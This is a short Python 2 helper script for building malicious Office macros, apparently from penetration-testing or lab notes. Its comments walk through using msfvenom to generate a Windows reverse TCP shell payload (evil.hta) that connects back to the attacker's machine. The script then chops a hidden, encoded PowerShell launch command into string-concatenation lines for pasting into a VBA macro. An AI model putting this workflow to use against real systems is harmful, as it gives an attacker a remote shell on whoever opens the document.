# How to use
#1. Create Payload
#Command: sudo msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f hta-psh -o evil.hta 

#2. Copy what was in the brackets and dumped it in macro.py after -e
#Command: cat evil.hta 

#3. Run the script then copy all the  Str = Str  lines into your macro
#Command: python2 macro.py        

str = "powershell.exe -nop -w hidden -e $catEvil.hta"

n = 50 

for i in range(0, len(str), n): 
    print "Str = Str + " + '"' + str[i:i+n] + '"' 